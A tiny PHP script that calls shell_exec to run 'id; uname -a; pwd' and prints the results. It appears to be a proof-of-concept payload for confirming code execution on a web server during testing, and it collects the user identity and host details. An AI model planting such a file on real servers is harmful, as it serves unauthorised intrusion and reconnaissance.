<?php
echo "<pre>";
echo htmlspecialchars(shell_exec("id; uname -a; pwd"));
echo "</pre>";
?>
